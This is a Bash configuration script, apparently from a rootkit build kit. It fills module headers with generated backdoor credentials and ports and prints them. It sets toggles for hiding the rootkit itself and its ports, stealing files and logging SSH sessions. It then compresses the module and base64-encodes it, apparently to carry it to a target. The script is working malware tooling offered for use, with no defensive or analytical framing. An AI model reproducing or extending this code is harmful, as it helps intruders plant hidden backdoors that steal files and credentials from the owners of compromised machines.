find_var_placeholders(){ # $1 = header paths
    local headers current_var \
          header_vars vars toggle_name

    headers=($1)

    for header in ${headers[@]}; do
        # read variable placeholders from within $header
        header_vars="`cat $header | grep '??'`"

        while read -r line; do
            # we don't do empty lines
            [ -z "$line" ] && continue

            # name of variable placeholder
            current_var="`echo -n "$line" | awk -F" " '{print $3}'`"
            [ -z $current_var ] && continue

            # if the variable placeholder's relative toggle
            # is disabled, don't bother fetching it.
            toggle_name="`get_toggle_name "$line"`"
            [ "`toggle_enabled $toggle_name`" == "false" ] && continue

            # add the variable placeholder's name to our list
            # so we can overwrite it very shortly.
            vars+=($current_var)
        done <<< "$header_vars"
    done

    echo -n "${vars[*]}"
}

# for every variable placeholder, we need
# some kind of input for it, do that here.
get_setting(){ # $1 = var
    local var name \
          input is_string
    var="$1"

    # standard lengths for variable values.
    # values are randomly generated unless a value
    # is otherwise specified at runtime.
    local default_strlen=6
    local default_intlen=4

    [[ $var == *"\""* ]] && is_string=1 || is_string=0

    [ $is_string == 1 ] && input="`random 'a-z' $default_strlen`"
    [ $is_string == 0 ] && input=`random '1-9' $default_intlen`

    eval "name=\"`printf ${var} | tr -d '\"\?,'`\""
    # this check here determines whether or not there is already
    # a value available for $input to use. (set at runtime or
    # predefined in one of the scripts, defaults.sh mainly)
    [ ! -z "`printf "${!name}"`" ] && input="${!name}"
    echo "$name = $input" >> $BDVLSO.creds

    [ `toggle_enabled USE_CRYPT` == "true" ] && [[ "$name" == *"_PWD" ]] && \
        input="`crypt_password $input`" # if the variable is intended to be a password,
                                        # make sure it's hashed before writing it anywhere

    # this bit here used to xor the input, if it's a string.
    # now just encapsulate it in quotation marks.
    [ $is_string == 1 ] && input="\"$input\""

    echo -n "$input:$var"
}

output_creds(){
    [ ! -f $BDVLSO.creds ] && return
    [ $USE_DIALOG == 0 ] && { echo; while read -r line; do necho "$line"; done <<< "`cat $BDVLSO.creds`"; echo; }
    [ $USE_DIALOG == 1 ] && show_file $BDVLSO.creds
    rm $BDVLSO.creds
}

# $1 = element of configuration (NEW_VALUE:PLACEHOLDER)
# $2 = header paths
overwrite_placeholder(){
    local headers=($2)
    IFS=':' read -r var_value var_name <<< "$1"
    for header in ${headers[@]}; do sed -i "s:${var_name}:${var_value}:" $header; done
}

toggle_setting(){ # $1 = name of toggle
    local toggle_name="$1"
    local toggle_status="`toggle_enabled $toggle_name`"
    [ "$toggle_status" == "true" ] && { echo "${toggle_name}=1" && return; }
    echo "${toggle_name}=0"
}

setup_configuration(){
    cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory"; exit; }

    echo && secho "Beginning configuration...\n"

    necho "Getting hooks"
    write_hooks >> $BDVL_H

    local var_placeholders settings index headers

    necho "Finding header paths"
    headers=(`find_header_paths`)
    for header in ${headers[@]}; do verbose "Header path: $header"; done

    echo; necho "Preparing your settings"
    var_placeholders=(`find_var_placeholders "${headers[*]}"`)
    for i in ${!var_placeholders[@]}; do
        local current_var="${var_placeholders[$i]}"
        settings+=(`get_setting "$current_var"`)

        [ `toggle_enabled HIDE_PORTS` == "false" ] && continue  # don't if we don't need to
        IFS=':' read -r curvar_val curvar_name <<< "${settings[$i]}"
        [[ "$curvar_name" == *"PORT"* ]] && add_hiddenport $curvar_name $curvar_val
    done

    secho "These are your defined/generated settings:"
    output_creds

    necho "Overwriting old variable placeholders"
    for selem in ${settings[@]}; do overwrite_placeholder "$selem" "${headers[*]}"; done

    [ "`toggle_enabled HIDE_PORTS`" == "true" ] && write_hideports $NEW_MDIR/hideports

    if [ $DOCOMPRESS == 1 ]; then
        [ ! -f `bin_path tar` ] && { eecho "Couldn't locate 'tar' on this machine."; exit; }
        echo; secho "Beginning compression of $NEW_MDIR"

        verbose "Writing some necessary files to $NEW_MDIR"
        verbose "Writing environment settings"
        write_defaults $NEW_MDIR/settings

        verbose "Writing toggle settings"
        local check_toggles=('ACCEPT_USE_SSL' 'USE_CRYPT' 'HIDE_SELF' 'HIDE_PORTS' \
                             'FILE_STEAL' 'LOG_SSH') # these toggles are necessary for auto.sh to
                                                     # check and react accordingly.
        for toggle in ${check_toggles[@]}; do toggle_setting $toggle >> $NEW_MDIR/toggles.conf; done

        local tarname="$NEW_MDIR.tar.gz"
        verbose "tarball name = $tarname"
        sleep 1
        tar cpfz $tarname $NEW_MDIR || { eecho "Failure trying to compress with tar (gzip)" && return; }
        secho "Finished compressing successfully"

        local tarb64="$NEW_MDIR.b64"
        necho "Writing $tarname into $tarb64"
        cat $tarname | base64 > $tarb64
    fi
}